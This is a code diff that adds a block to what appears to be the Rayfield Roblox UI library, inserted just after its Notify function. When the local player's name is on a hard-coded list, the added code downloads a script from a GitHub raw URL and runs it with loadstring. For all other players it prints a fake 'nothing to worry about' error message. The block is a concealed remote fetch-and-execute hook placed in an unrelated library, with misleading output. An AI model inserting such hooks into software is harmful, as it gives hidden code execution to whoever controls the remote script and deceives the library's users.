@@ -520,6 +520,22 @@ function RayfieldLibrary:Notify(data)
 	end)
 end
 
+local allowedNames = {
+	["L0CKED_1N1"] = true,
+	["adorxfleurys"] = true,
+	["CHEATING_B0SS"] = true
+}
+
+if getgenv().css_digital then
+	warn("Already Ran!")
+elseif allowedNames[game.Players.LocalPlayer.Name] then
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/bruhlolw/refs/heads/main/prote'))()
+	wait(0.1)
+	getgenv().css_digital = true
+else
+	warn("[OUTPUT]: (If you are seeing this as a yellow/warning message, it is nothing to worry about): Stack Begin\nLine 34:\nPacket_Data expected, got nil.\nStack End.")
+end
+
 local function openSearch()
 	searchOpen = true
 
